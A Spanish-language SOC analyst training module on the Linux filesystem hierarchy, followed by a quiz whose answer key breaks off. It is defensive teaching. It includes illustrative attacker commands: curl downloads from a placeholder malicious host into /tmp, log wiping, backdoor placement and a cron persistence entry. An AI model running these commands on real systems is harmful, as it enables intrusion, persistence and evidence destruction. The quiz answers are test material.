**📘 Carrera de Analista <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>**

**Semana 3 – Linux**

**Módulo 15 – Estructura del Sistema de Archivos (<a href="../../GLOSARIO.md#fhs" target="_blank">FHS</a>)**

**Nivel:** Principiante → Analista SOC Nivel 1

**Antes de comenzar**

Ya dominas:

- ✅ <a href="../../GLOSARIO.md#ip" target="_blank">IP</a> Públicas y Privadas

- ✅ Modelo <a href="../../GLOSARIO.md#osi" target="_blank">OSI</a>

- ✅ Modelo <a href="../../GLOSARIO.md#tcp" target="_blank">TCP</a>/IP

- ✅ TCP y <a href="../../GLOSARIO.md#udp" target="_blank">UDP</a>

- ✅ Puertos

- ✅ <a href="../../GLOSARIO.md#dns" target="_blank">DNS</a>, <a href="../../GLOSARIO.md#dhcp" target="_blank">DHCP</a>, <a href="../../GLOSARIO.md#http" target="_blank">HTTP</a> y <a href="../../GLOSARIO.md#https" target="_blank">HTTPS</a>

- ✅ Introducción a Linux y la Terminal (<a href="../../GLOSARIO.md#cli" target="_blank">CLI</a>)

Ahora vas a aprender cómo Linux organiza sus archivos.

Linux organiza todos sus archivos en una sola estructura de árbol desde la raíz `/`.

A diferencia de Windows, no hay unidades como C: o D:.

Todo cuelga de un único punto de partida.

Conocer esa estructura es esencial para un Analista SOC.

Los logs de seguridad, las configuraciones y los binarios viven en lugares específicos.

Saber dónde buscar es el primer paso de toda investigación.

Cuando un equipo es comprometido, la evidencia no está dispersa al azar.

Está en directorios concretos, con nombres concretos.

Este módulo te enseña exactamente dónde encontrarla.

**🎯 Objetivos de aprendizaje**

Al finalizar este módulo podrás:

- Comprender qué es el estándar FHS.

- Explicar por qué todo parte de la raíz `/`.

- Identificar qué contiene cada directorio principal.

- Saber dónde viven los binarios esenciales del sistema.

- Reconocer `/etc` como el centro de configuración.

- Diferenciar `/home` y `/root`.

- Ubicar los logs en `/var/log`.

- Explicar por qué `/tmp` es sospechoso en una investigación.

- Entender qué son `/proc` y `/dev`.

- Saber qué directorios revisar primero ante un posible incidente.

**1. ¿Qué es FHS?**

FHS significa:

**Filesystem Hierarchy Standard**

**Estándar de Jerarquía del Sistema de Archivos**

Es el estándar que define dónde vive cada cosa en Linux.

Gracias a él, los directorios tienen los mismos nombres en casi todas las distribuciones.

En Ubuntu, Debian, CentOS, Kali o Fedora:

Los archivos de configuración están en `/etc`.

Los logs están en `/var/log`.

Los programas esenciales están en `/bin`.

Esa uniformidad es una gran ventaja.

Aprendes un solo mapa y sirve para todos los sistemas Linux.

**Analogía**

Imagina un gran edificio de oficinas.

Cada piso tiene una función definida.

- El sótano guarda los servidores.

- La planta baja recibe a las visitas.

- El piso 1 es administración.

- El piso 2 es ventas.

- El piso 3 es el archivo histórico.

Cuando necesitas un documento, no lo buscas al azar.

Sabes exactamente a qué piso ir.

El FHS es exactamente eso: un edificio organizado por departamentos.

Cada directorio es un departamento con una misión clara.

**¿Por qué le importa a un SOC?**

Porque al investigar un incidente necesitas saber dónde buscar:

- ¿Intentos de login fallidos? → `/var/log/auth.log`.

- ¿Usuarios creados? → `/etc/passwd`.

- ¿Programas instalados? → `/var/log/dpkg.log`.

- ¿Archivos sospechosos? → `/tmp`.

El atacante también conoce esta estructura.

La usa para moverse, para esconderse y para borrar rastros.

Tu ventaja es conocerla mejor que él.

**2. La raíz `/`**

Todo en Linux parte de la raíz.

Se representa con una barra diagonal:

`/`

Es el nivel más alto de la estructura.

Todos los demás directorios cuelgan de ahí.

**Analogía**

Piensa en un árbol real.

El tronco sostiene todas las ramas.

La raíz es el punto donde todo se conecta.

En Linux, `/` es ese tronco.

- `/home`

- `/etc`

- `/var`

- `/usr`

- `/bin`

Son ramas que nacen directamente del tronco.

**El árbol de directorios**

```
/
├── /bin      → Programas esenciales
├── /sbin     → Programas de administración
├── /etc      → Configuración del sistema
├── /home     → Carpetas de los usuarios
├── /root     → Carpeta del administrador
├── /var      → Datos variables (logs)
├── /tmp      → Archivos temporales
├── /usr      → Software instalado
├── /opt      → Programas de terceros
├── /proc     → Información de procesos
├── /dev      → Dispositivos
├── /mnt      → Unidades montadas manualmente
└── /media    → Unidades extraíbles (USB)
```

Este diagrama es tu mapa.

Memorízalo como memorizaste los puertos en Redes II.

**¿Cómo navegas por el árbol?**

Para ir a la raíz:

`cd /`

Para ver dónde estás:

`pwd`

Para listar el contenido de un directorio:

`ls /`

Para ver en qué parte del árbol estás:

`pwd`

Cuando veas rutas como:

`/var/log/auth.log`

Léelas de izquierda a derecha:

- `/` es la raíz.

- `var` es una rama.

- `log` es una sub-rama.

- `auth.log` es el archivo.

Cada barra separa un nivel del árbol.

**Ruta absoluta vs ruta relativa**

Una ruta absoluta siempre empieza con `/`.

Ejemplo:

`/etc/passwd`

Una ruta relativa depende de dónde estás.

Si estás en `/etc`, escribir:

`passwd`

Te refiere al mismo archivo.

Para un SOC, lo habitual es usar rutas absolutas.

Así no hay lugar a confusiones.

**3. `/bin` y `/sbin`**

Estos directorios contienen los binarios del sistema.

Un binario es un programa ejecutable.

**`/bin`**

Contiene los programas esenciales para el sistema.

Programas que cualquier usuario puede ejecutar.

Ejemplos:

`ls`

`cat`

`cp`

`mv`

`echo`

`grep`

Estos comandos los usarás todos los días.

**`/sbin`**

Contiene programas de administración.

Requieren privilegios de <a href="../../GLOSARIO.md#root" target="_blank">root</a> normalmente.

Ejemplos:

`mount`

`fdisk`

`iptables`

`reboot`

`shutdown`

La "s" de `/sbin` significa "system".

Son herramientas para administrar el sistema.

**Nota importante**

En distribuciones modernas, `/bin` y `/usr/bin` suelen ser el mismo lugar.

Algunos son enlaces simbólicos.

No te preocupes por ese detalle por ahora.

Lo importante es entender la función.

**¿Por qué le importa a un SOC?**

Los atacantes a veces reemplazan binarios legítimos.

Si el `ls` o el `cat` están modificados, no puedes confiar en lo que ves.

Esa técnica se llama **Rootkit**.

También colocan herramientas maliciosas disfrazadas de binarios normales.

Por eso existen herramientas de verificación de integridad.

Comparan el hash de cada binario con el valor original.

Ejemplo de comando para ver el hash de un binario:

`sha256sum /bin/ls`

Si el hash no coincide con el esperado, algo está mal.

Un Analista SOC debe saber esto.

**¿Cómo explorar estos directorios?**

Para listar los binarios:

`ls /bin`

Para buscar un comando específico:

`which cat`

Para ver dónde está el ejecutable de un programa:

`which nmap`

**4. `/usr` y `/opt`**

Estos directorios almacenan software instalado.

**`/usr`**

Contiene la mayor parte del software del sistema.

La sigla significa "User System Resources".

Aquí viven:

- Programas.

- Bibliotecas.

- Documentación.

Algunas subcarpetas importantes:

`/usr/bin`

Contiene la mayoría de los comandos.

`/usr/local/bin`

Programas compilados o instalados localmente.

`/usr/share`

Archivos compartidos, documentación, iconos.

`/usr/lib`

Bibliotecas del sistema.

**`/opt`**

Contiene programas de terceros.

Software que no forma parte del sistema base.

Ejemplos típicos:

- Paquetes comerciales.

- Aplicaciones descargadas por separado.

- Herramientas que vienen en carpetas propias.

Cada programa suele tener su propia carpeta.

Ejemplo:

`/opt/teamviewer`

`/opt/google/chrome`

**¿Por qué le importa a un SOC?**

Un atacante con privilegios puede instalar backdoors en:

`/usr/local/bin`

`/opt`

Esos lugares parecen inofensivos.

Y no siempre son revisados con atención.

Un binario extraño en `/usr/local/bin` merece investigación.

Preguntas que debes hacerte:

- ¿Ese programa fue instalado por el administrador?

- ¿Existe en el inventario de software de la empresa?

- ¿Cuándo se creó el archivo?

Para ver los archivos más recientes:

`ls -la /usr/local/bin`

Para ver las fechas de creación:

`ls -lat /usr/local/bin`

La fecha y hora de creación es evidencia valiosa.

**5. `/etc`**

Este es el directorio más importante para configurar Linux.

`/etc` significa "etcétera".

Es el **cerebro de configuración** del sistema.

Aquí viven los archivos que definen cómo funciona el equipo.

Prácticamente toda la configuración está en `/etc`.

**Archivos esenciales**

`/etc/passwd`

Lista los usuarios del sistema.

Cada línea es un usuario.

Contiene:

- Nombre de usuario.

- UID.

- GID.

- Carpeta personal.

- <a href="../../GLOSARIO.md#shell" target="_blank">Shell</a>.

Aquí NO se guardan las contraseñas.

Solo un símbolo `x` en la posición de la contraseña.

`/etc/shadow`

Contiene los hashes de las contraseñas.

Solo el root puede leerlo.

Es un archivo extremadamente sensible.

Si un atacante lo copia, puede intentar descifrar los hashes offline.

`/etc/hosts`

Permite asociar nombres con direcciones IP localmente.

Se consulta antes que el DNS.

Ejemplo de contenido:

127.0.0.1 localhost

Un atacante puede modificarlo para redirigir tráfico.

`/etc/ssh/sshd_config`

Configuración del servidor <a href="../../GLOSARIO.md#ssh" target="_blank">SSH</a>.

Define:

- Puerto de escucha.

- Si se permite acceso con root.

- Si se permite login por contraseña.

- Qué usuarios pueden conectarse.

`/etc/cron.d`

Contiene tareas programadas.

El sistema las ejecuta automáticamente.

Un atacante puede añadir aquí sus scripts maliciosos.

`/etc/fstab`

Define qué unidades se montan al iniciar el sistema.

`/etc/sudoers`

Define quién puede usar `sudo`.

`/etc/hostname`

Define el nombre del equipo.

`/etc/resolv.conf`

Define los servidores DNS del sistema.

**¿Cómo leer estos archivos?**

Para ver los usuarios:

`cat /etc/passwd`

Para ver los grupos:

`cat /etc/group`

Para ver las tareas programadas:

`ls /etc/cron.d`

Para ver la configuración de SSH:

`cat /etc/ssh/sshd_config`

**¿Por qué le importa a un SOC?**

`/etc` es lectura obligatoria.

Un analista debe saber:

- Qué usuarios existen.

- Qué tareas se ejecutan automáticamente.

- Qué servicios están configurados.

- Si hay configuraciones inseguras.

Cuando hay sospecha de compromiso, se revisa:

- `cat /etc/passwd` para detectar usuarios nuevos.

- `ls -la /etc/cron.d` para detectar tareas maliciosas.

- `cat /etc/shadow` para comprobar cuentas.

Cambios inesperados en `/etc` son señales de alerta.

**6. `/home` y `/root`**

Estos son los directorios personales.

**`/home`**

Contiene una carpeta por cada usuario normal.

Ejemplo:

`/home/ana`

`/home/pedro`

Cada usuario guarda aquí sus archivos.

- Documentos.

- Descargas.

- Configuraciones personales.

- Historiales.

Para ver tu carpeta personal:

`echo $HOME`

Para ir a tu carpeta:

`cd ~`

**`/root`**

Es la carpeta personal del administrador.

El usuario root es el todopoderoso del sistema.

Por eso tiene su propia carpeta fuera de `/home`.

`/root`

Aquí el administrador guarda sus archivos personales.

También suele guardar:

- Scripts de administración.

- Respaldos.

- Credenciales y llaves (¡cuidado!).

**¿Por qué le importa a un SOC?**

Las carpetas personales pueden contener:

- Datos robados.

- Herramientas maliciosas.

- Scripts maliciosos.

- Artefactos de la intrusión.

Un usuario de la empresa que no debería tener scripts en su carpeta... es sospechoso.

Para ver el contenido de una carpeta:

`ls -la /home/ana`

Para ver los archivos ocultos:

`ls -la /home/ana`

Los archivos que empiezan con punto son ocultos.

Ejemplo:

`/home/ana/.bash_history`

Guarda el historial de comandos.

Es una mina de oro forense.

Revela qué comandos ejecutó el usuario.

**7. `/var` y `/var/log`**

`/var` contiene datos variables.

Son datos que cambian constantemente.

Ejemplos:

- Colas de correo.

- Bases de datos.

- Páginas web temporales.

- **Logs del sistema**.

La subcarpeta más importante para ti:

`/var/log`

**La mina de oro del SOC.**

Aquí viven los registros de actividad del sistema.

Todo lo que pasa queda anotado.

**`/var/log/auth.log`**

Registra los eventos de autenticación.

Intentos de login:

- Exitosos.

- Fallidos.

- Usuarios inexistentes.

- Usos de `sudo`.

Es el primer archivo que revisas ante una intrusión.

**`/var/log/syslog`**

Registra mensajes generales del sistema.

- Servicios que se inician.

- Errores.

- Mensajes de aplicaciones.

**`/var/log/kern.log`**

Registra mensajes del <a href="../../GLOSARIO.md#kernel" target="_blank">kernel</a>.

- Hardware.

- Módulos.

- Errores del núcleo.

**Otros logs importantes**

`/var/log/dpkg.log`

Instalaciones y actualizaciones de paquetes.

`/var/log/apt/`

Logs del gestor de paquetes <a href="../../GLOSARIO.md#apt" target="_blank">apt</a>.

`/var/log/btmp`

Intentos de login fallidos.

`/var/log/wtmp`

Historial de inicios de sesión.

`/var/log/lastlog`

Última vez que cada usuario inició sesión.

`/var/log/apache2/`

Logs del servidor web Apache.

`/var/log/nginx/`

Logs del servidor web Nginx.

`/var/log/mysql/`

Logs de la base de datos MySQL.

**¿Cómo leer los logs?**

Para ver los últimos eventos:

`tail -n 50 /var/log/auth.log`

Para buscar intentos fallidos:

`grep "Failed password" /var/log/auth.log`

Para ver errores en el sistema:

`grep -i error /var/log/syslog`

Para ver en vivo lo que se escribe:

`tail -f /var/log/syslog`

Para ver quién inició sesión recientemente:

`last`

**¿Por qué le importa a un SOC?**

Los logs cuentan la historia del incidente.

Un ataque deja huellas aquí.

El analista lee esa historia para entender qué pasó.

¿Cómo entró el atacante?

¿Cuándo?

¿Desde qué IP?

¿Qué hizo después?

Todo eso está en `/var/log`.

Si los logs están vacíos o con saltos raros... es una señal muy grave.

Puede significar que el atacante los borró.

**8. `/tmp`**

Contiene archivos temporales.

Cualquier usuario puede escribir aquí.

Es un espacio compartido del sistema.

Las aplicaciones lo usan para:

- Archivos temporales.

- Descargas a medias.

- Datos en proceso.

- Archivos descomprimidos.

En muchos sistemas se limpia al reiniciar.

**Analogía**

Piensa en una mesa de trabajo compartida.

Todo el mundo puede dejar cosas.

Todo el mundo puede llevarse cosas.

Nadie la revisa a fondo.

**¿Por qué es la zona favorita de los atacantes?**

Por tres razones:

1. Cualquiera puede escribir en `/tmp`.

2. No requiere permisos especiales.

3. Nadie suele mirar ahí.

Los atacantes sueltan aquí sus payloads.

Ejemplo:

Un atacante logra ejecutar comandos.

Descarga su herramienta maliciosa:

`curl http://IP-maliciosa/tool -o /tmp/exploit`

La ejecuta:

`/tmp/exploit`

Todo queda fuera de la vista.

En Windows el equivalente sería la carpeta de archivos temporales del usuario.

**¿Cómo buscar en `/tmp`?**

Para listar el contenido:

`ls -la /tmp`

Para ver archivos modificados recientemente:

`ls -lat /tmp`

Para buscar archivos ejecutables:

`find /tmp -type f -executable`

Para ver qué procesos usan `/tmp`:

`lsof | grep /tmp`

Si encuentras archivos sospechosos, no los ejecutes.

Cópialos y analízalos.

Calcula su hash:

`sha256sum /tmp/archivo-sospechoso`

Ese hash se puede buscar en bases de datos de malware.

**9. `/proc` y `/dev`**

Estos son pseudo-sistemas de archivos.

No contienen archivos reales en el disco.

Se generan en memoria cuando el sistema funciona.

**`/proc`**

Expone información del sistema y de los procesos.

`/proc/cpuinfo`

Información del procesador.

`/proc/meminfo`

Información de la memoria RAM.

`/proc/version`

Versión del kernel.

`/proc/uptime`

Tiempo que el sistema lleva encendido.

Cada proceso en ejecución tiene su carpeta:

`/proc/1234`

El número es el <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> (Process ID).

Dentro se puede ver:

- El comando ejecutado.

- Los archivos abiertos.

- La memoria del proceso.

Para ver los procesos:

`ps aux`

Para ver un proceso específico:

`cat /proc/1234/cmdline`

Para ver los procesos con detalle en vivo:

`top`

**`/dev`**

Contiene los archivos de dispositivos.

Representa hardware como si fueran archivos.

Ejemplos:

`/dev/sda`

Primer disco duro.

`/dev/sda1`

Primera partición del primer disco.

`/dev/null`

Ese agujero negro que descarta todo.

`/dev/random`

Generador de números aleatorios.

**¿Por qué le importa a un SOC?**

`/proc` revela qué procesos corre el sistema.

Puedes detectar:

- Procesos con nombres extraños.

- Procesos corriendo desde `/tmp`.

- Procesos disfrazados.

Ejemplo de proceso sospechoso:

Un proceso llamado `kworker` con otra ruta de ejecución.

Para ver la ruta del ejecutable de un proceso:

`readlink -f /proc/PID/exe`

Si el ejecutable está en `/tmp` o `/dev/shm`... alerta.

`/dev/shm` es otra zona usada por malware para esconderse.

**10. `/mnt` y `/media`**

Aquí se montan las unidades.

Montar significa conectar un dispositivo al sistema.

Se crea una carpeta que representa el contenido.

**`/media`**

Usado para unidades extraíbles.

- USB.

- CDs.

- Tarjetas SD.

El sistema lo hace automáticamente.

**`/mnt`**

Usado para montajes manuales.

El administrador lo usa para:

- Discos adicionales.

- Particiones.

- Sistemas de archivos de red.

Es un espacio de trabajo temporal.

**¿Cómo se ve un montaje?**

Para ver las unidades montadas:

`mount`

Para ver el espacio de disco:

`df -h`

Para montar un USB manualmente:

`sudo mount /dev/sdb1 /mnt`

Para desmontar:

`sudo umount /mnt`

**¿Por qué le importa a un SOC?**

Un USB sospechoso puede ser la puerta de entrada de un ataque.

También sirve para sacar datos de la red (exfiltración).

Si aparece un dispositivo extraño en `df -h`, hay que investigar.

Revisar montajes es parte del análisis de un equipo comprometido.

**11. Tabla resumen de directorios**

| **Directorio** | **Contenido**                                   | **Importancia SOC**                                    |
|----------------|-------------------------------------------------|--------------------------------------------------------|
| `/`            | Raíz del sistema de archivos                    | Todo cuelga de aquí.                                  |
| `/bin`         | Comandos esenciales (ls, cat, cp)               | Verificar integridad de binarios.                     |
| `/sbin`        | Comandos de administración (mount, fdisk)       | Herramientas de sistema.                              |
| `/etc`         | Configuración del sistema                       | Usuarios, servicios, tareas programadas.              |
| `/home`        | Carpetas personales de usuarios                 | Artefactos y datos de los usuarios.                   |
| `/root`        | Carpeta del administrador                       | Solo root. Scripts y respaldos.                       |
| `/var`         | Datos variables                                 | Contiene los logs.                                    |
| `/var/log`     | Logs del sistema y servicios                    | La mina de oro del SOC.                               |
| `/tmp`         | Archivos temporales                             | Zona favorita para soltar payloads.                   |
| `/usr`         | Software instalado                              | Binarios y bibliotecas.                               |
| `/opt`         | Software de terceros                            | Posibles backdoors.                                   |
| `/proc`        | Información de procesos (memoria)               | Detectar procesos sospechosos.                        |
| `/dev`         | Dispositivos                                    | Unidades de disco y hardware.                         |
| `/mnt`         | Montajes manuales                               | Unidades externas montadas.                           |
| `/media`       | Unidades extraíbles (USB)                       | Medios extraíbles conectados.                         |

**12. ¿Cómo aprovechan esto los atacantes?**

**Ataque 1 – Enumeración de usuarios y configuraciones**

El atacante lee los archivos de configuración para conocer el sistema.

Primero lee:

`cat /etc/passwd`

Obtiene la lista de usuarios.

Luego intenta:

`cat /etc/shadow`

Si logra leerlo, tiene los hashes de las contraseñas.

También revisa:

- `/etc/hosts`

- `/etc/ssh/sshd_config`

- `/etc/sudoers`

Cada archivo le da información para el siguiente paso.

¿Cómo lo detectas?

Buscando accesos repetidos a estos archivos en los logs.

**Ataque 2 – Ocultar herramientas maliciosas en `/tmp`**

El atacante escribe sus herramientas en `/tmp`.

Cualquiera puede escribir ahí.

Nadie suele mirar ahí.

Descarga su malware:

`curl http://malicioso/tool -o /tmp/tool`

Le da permisos de ejecución:

`chmod +x /tmp/tool`

Y lo ejecuta:

`/tmp/tool`

¿Cómo lo detectas?

Buscando archivos nuevos y ejecutables en `/tmp`.

También con `lsof` para ver qué procesos usan archivos de `/tmp`.

**Ataque 3 – Borrar o alterar logs en `/var/log`**

El atacante quiere borrar sus huellas.

Vacía el registro de autenticación:

`echo "" > /var/log/auth.log`

O directamente lo borra:

`rm /var/log/auth.log`

También modifica las fechas de sus acciones.

¿Cómo lo detectas?

Un log vacío o con huecos es una señal de alerta.

También revisando si existen herramientas como:

`/var/log/utmp` manipulado.

La falta de logs es en sí misma una evidencia.

**Ataque 4 – Instalar backdoors en `/usr/local/bin` o `/opt`**

El atacante coloca programas maliciosos en lugares legítimos.

Copia su backdoor:

`cp /tmp/backdoor /usr/local/bin/update`

Le da permisos:

`chmod +x /usr/local/bin/update`

El archivo parece un programa normal.

¿Cómo lo detectas?

Verificando la integridad de los binarios.

Comparando los hashes con valores conocidos.

Revisando las fechas de creación de archivos.

**Ataque 5 – Scripts de inicio en `/etc/cron.d` o `rc.local`**

El atacante quiere que su malware se ejecute al iniciar el sistema.

Crea una tarea programada:

`echo "*/5 * * * * root /tmp/backdoor" > /etc/cron.d/persistence`

O modifica los scripts de arranque.

Así su malware se ejecuta cada 5 minutos.

O cada vez que el sistema reinicia.

¿Cómo lo detectas?

Revisando:

`ls -la /etc/cron.d`

`cat /etc/crontab`

`cat /etc/rc.local`

Toda tarea nueva que no reconoces es sospechosa.

**13. ¿Cómo defenderse?**

**Permisos restrictivos en `/etc` y `/var/log`**

Solo root y los usuarios autorizados deben leerlos.

Los logs no deben ser escribibles por cualquiera.

Para ver los permisos:

`ls -la /etc`

Para ver los permisos de los logs:

`ls -la /var/log`

**Monitoreo de integridad de binarios y logs**

Herramientas como AIDE o Tripwire detectan cambios.

Comparan hashes y permisos periódicamente.

Si un binario cambia, generan alerta.

**Impedir ejecución desde `/tmp` (noexec)**

Se monta `/tmp` con la opción `noexec`.

Así, aunque haya un payload, no se puede ejecutar.

Ejemplo en `/etc/fstab`:

tmpfs /tmp tmpfs defaults,noexec 0 0

**Mantener logs centralizados fuera del equipo**

Enviar los logs a un servidor central o <a href="../../GLOSARIO.md#siem" target="_blank">SIEM</a>.

Aunque el atacante borre los logs locales, el SIEM conserva copias.

El protocolo es `syslog`.

**Menor privilegio**

Cada usuario debe tener solo los permisos que necesita.

Los servicios no deben correr como root.

Así un atacante no escala tan fácil.

**Otros consejos**

- Auditar cambios en `/etc`.

- Revisar las tareas programadas periódicamente.

- Buscar archivos nuevos en `/tmp` y `/dev/shm`.

- Mantener el sistema actualizado.

- Usar `auditd` para registrar accesos a archivos sensibles.

**14. Aplicación práctica en un SOC**

**Caso 1 – Sospecha de compromiso**

Recibes una alerta de intentos de acceso.

¿Por dónde empiezas?

Revisas los intentos de autenticación:

`grep "Failed password" /var/log/auth.log`

Luego ves si hubo accesos exitosos:

`grep "Accepted password" /var/log/auth.log`

Identificas:

- La IP del atacante.

- El usuario atacado.

- La hora del acceso.

Eso te da la línea de tiempo inicial.

**Caso 2 – Confirmar usuarios creados**

Durante una investigación encuentras una cuenta extraña.

Revisas los usuarios del sistema:

`cat /etc/passwd`

Buscas nombres que no reconozcas.

Ejemplo de línea sospechosa:

hacker:x:1001:1001::/home/hacker:/bin/<a href="../../GLOSARIO.md#bash" target="_blank">bash</a>

También verificas cuándo se creó:

`ls -la /etc/passwd`

Y si se usó `sudo` para crear usuarios:

`grep useradd /var/log/auth.log`

**Caso 3 – Buscar archivos extraños en `/tmp`**

Un equipo se comporta raro.

Buscas archivos sospechosos:

`ls -lat /tmp`

Ves ejecutables con fechas recientes.

`find /tmp -type f -executable`

Calculas su hash:

`sha256sum /tmp/archivo`

Consultas el hash en bases de datos de malware.

**Caso 4 – Verificar binarios de `/usr/bin` con hashes**

Dudas de la integridad de un equipo.

Calculas el hash de binarios críticos:

`sha256sum /usr/bin/ssh`

`sha256sum /usr/bin/sudo`

Comparas con los valores oficiales de la <a href="../../GLOSARIO.md#distribucion" target="_blank">distribución</a>.

Cualquier diferencia es un indicio de rootkit.

**¿Dónde mirar primero en una investigación?**

Orden recomendado:

1. `/var/log/auth.log` → acceso y autenticación.

2. `/etc/passwd` y `/etc/shadow` → usuarios.

3. `/tmp` y `/dev/shm` → archivos sospechosos.

4. `/etc/cron.d` y `/etc/crontab` → persistencia.

5. `/usr/bin` y `/usr/local/bin` → binarios modificados.

6. Procesos en `ps aux` → qué corre el sistema.

**15. Lo que esperan de un Analista SOC Nivel 1**

En una entrevista o prueba técnica te preguntarán cosas como:

**¿Dónde están los logs?**

En `/var/log`.

**¿Dónde están las configuraciones?**

En `/etc`.

**¿Qué carpetas son de usuarios?**

`/home` para usuarios normales.

`/root` para el administrador.

**¿Qué es `/tmp`?**

La carpeta de archivos temporales.

Cualquier usuario puede escribir ahí.

Zona favorita de los atacantes.

**¿Qué es `/proc`?**

Información de procesos en memoria.

**¿Dónde están los programas del sistema?**

En `/bin`, `/sbin` y `/usr/bin`.

**¿Qué contiene `/etc/passwd`?**

Los usuarios del sistema.

**¿Qué contiene `/etc/shadow`?**

Los hashes de las contraseñas.

Solo lo lee root.

Debes responder estas preguntas sin dudar.

Son la base de todas las investigaciones en Linux.

**16. Resumen**

**FHS**

- Estándar de jerarquía del sistema de archivos.

- Define dónde vive cada cosa.

- Igual en casi todas las distribuciones.

**Directorio principal**

- Todo cuelga de `/`.

**Binarios**

- `/bin` y `/sbin` → programas esenciales.

- `/usr` y `/opt` → software instalado.

**Configuración**

- `/etc` → el cerebro de configuración.

- `/etc/passwd` → usuarios.

- `/etc/shadow` → hashes de contraseñas.

**Usuarios**

- `/home` → carpetas de usuarios.

- `/root` → carpeta del administrador.

**Logs**

- `/var/log` → la mina de oro del SOC.

- `/var/log/auth.log` → autenticación.

- `/var/log/syslog` → mensajes del sistema.

- `/var/log/kern.log` → mensajes del kernel.

**Temporal y procesos**

- `/tmp` → temporales, zona sospechosa.

- `/proc` → procesos en memoria.

- `/dev` → dispositivos.

**Montajes**

- `/mnt` y `/media` → unidades montadas.

**Riesgos principales**

- Enumeración leyendo `/etc`.

- Payloads en `/tmp`.

- Borrado de logs.

- Backdoors en `/usr/local/bin` y `/opt`.

- Persistencia en `/etc/cron.d` y `rc.local`.

**Defensas principales**

- Permisos restrictivos.

- Monitoreo de integridad.

- `noexec` en `/tmp`.

- Logs centralizados.

- Menor privilegio.

**🧠 Conceptos clave para memorizar**

| **Concepto** | **Debes recordar**                                       |
|--------------|----------------------------------------------------------|
| FHS          | Estándar de jerarquía del sistema de archivos.           |
| `/`          | Raíz. Todo cuelga de aquí.                               |
| `/etc`       | Configuración del sistema. Cerebro de Linux.             |
| `/etc/passwd`| Usuarios del sistema.                                    |
| `/etc/shadow`| Hashes de contraseñas. Solo root.                        |
| `/home`      | Carpetas personales de los usuarios.                     |
| `/root`      | Carpeta personal del administrador.                      |
| `/var/log`   | Logs del sistema. La mina de oro del SOC.                |
| `/var/log/auth.log` | Intentos de login y uso de <a href="../../GLOSARIO.md#sudo" target="_blank">sudo</a>.                  |
| `/tmp`       | Temporales. Zona favorita de los atacantes.              |
| `/proc`      | Información de procesos en memoria.                      |
| `/bin`       | Comandos esenciales (ls, cat).                           |
| `/usr`       | Software instalado del sistema.                          |
| `/opt`       | Software de terceros.                                    |
| `/dev`       | Dispositivos como archivos.                              |

**🎓 Consejo como tu instructor de SOC**

Memoriza dónde vive la evidencia.

Si te preguntan:

"¿Dónde buscarías intentos de login fallidos?"

La respuesta es inmediata:

`/var/log/auth.log`

Si te preguntan:

"¿Cómo detectarías un usuario creado por un atacante?"

`cat /etc/passwd`

"¿Dónde escondería un atacante sus herramientas?"

`/tmp`

"¿Dónde buscarías persistencia?"

`/etc/cron.d`

El conocimiento del sistema de archivos convierte los logs en investigaciones.

Un analista que sabe dónde mirar encuentra lo que necesita en minutos.

Otro que no sabe, pierde horas buscando al azar.

A partir de ahora, cuando veas una ruta como:

`/var/log/auth.log`

Tu mente debe hacer esta asociación automática:

**`/var/log/auth.log` → Autenticación → Intentos de login → Quién entró, desde dónde, cuándo → Evidencia de intrusión.**

Y cuando veas:

`/tmp`

Debes pensar:

**`/tmp` → Temporal → Cualquiera puede escribir → Payloads → Archivos sospechosos por investigar.**

Estas asociaciones son el reflejo profesional de un Analista SOC.

La estructura de archivos no es un tema aburrido de administración.

Es tu mapa de la evidencia.

Conócelo bien.

---

**📘 Carrera de Analista SOC**

**Semana 3 – Linux**

**Evaluación – Módulo 15: Estructura del Sistema de Archivos (FHS)**

**Nivel:** Principiante → Analista SOC Nivel 1

**Instrucciones:** Responde las siguientes preguntas sin consultar el material de estudio. Este examen está diseñado con el nivel de dificultad de una prueba para un **Analista SOC Nivel 1**. Encontrarás preguntas conceptuales y casos prácticos basados en situaciones reales de investigación en Linux.

**Pregunta 1**

¿Qué significa la sigla **FHS**?

**A)** File Hierarchy System

**B)** Filesystem Hierarchy Standard

**C)** File Hosting Service

**D)** Filesystem Home Standard

**Pregunta 2**

¿Qué contiene el directorio **`/etc`**?

**A)** Los logs del sistema.

**B)** Los archivos de configuración del sistema.

**C)** Las carpetas personales de los usuarios.

**D)** Los programas esenciales del sistema.

**Pregunta 3**

¿Dónde viven normalmente los **logs** del sistema?

**A)** `/etc`

**B)** `/bin`

**C)** `/var/log`

**D)** `/home`

**Pregunta 4**

¿Qué es **`/tmp`** y por qué es una zona sospechosa?

**A)** Contiene los hashes de las contraseñas.

**B)** Es la carpeta de archivos temporales donde cualquier usuario puede escribir, y los atacantes suelen soltar payloads ahí.

**C)** Almacena el historial de inicios de sesión.

**D)** Es donde se montan los discos de red.

**Pregunta 5**

¿Qué es **`/home`**?

**A)** El directorio de configuración del sistema.

**B)** La carpeta de logs de los usuarios.

**C)** El conjunto de carpetas personales de los usuarios del sistema.

**D)** La raíz del sistema de archivos.

**Pregunta 6**

¿Qué expone el directorio **`/proc`**?

**A)** Información del sistema y de los procesos en memoria.

**B)** Las contraseñas de los usuarios.

**C)** Los archivos de configuración de SSH.

**D)** Los binarios esenciales del sistema.

**Pregunta 7**

¿Qué representa la barra **`/`** en Linux?

**A)** Una partición de disco separada.

**B)** La raíz del sistema de archivos, de la que cuelgan todos los directorios.

**C)** La carpeta temporal del usuario root.

**D)** El directorio de logs del sistema.

**Pregunta 8**

¿Qué tipo de archivos contiene **`/bin`**?

**A)** Archivos temporales.

**B)** Logs de autenticación.

**C)** Programas esenciales del sistema, como `ls` y `cat`.

**D)** Los hashes de las contraseñas.

**Pregunta 9**

¿Qué archivo contiene la lista de **usuarios** del sistema?

**A)** `/var/log/auth.log`

**B)** `/etc/shadow`

**C)** `/etc/passwd`

**D)** `/proc/cpuinfo`

**Pregunta 10 (Caso práctico SOC)**

Un analista debe revisar los **intentos de inicio de sesión** en un servidor Linux que se sospecha comprometido.

¿Dónde debería buscar primero?

**A)** En `/tmp`.

**B)** En `/var/log/auth.log`.

**C)** En `/bin`.

**D)** En `/home`.

**✅ Respuestas y justificación**

**Pregunta 1**

✅ **Respuesta correcta: B**

**Justificación**

FHS significa **Filesystem Hierarchy Standard**.

Es el estándar que define la jerarquía de directorios en Linux.

Gracias a él, los archivos de configuración, los logs y los binarios viven en los mismos lugares en casi todas las distribuciones.

**Pregunta 2**

✅ **Respuesta correcta: B**

**Justificación**

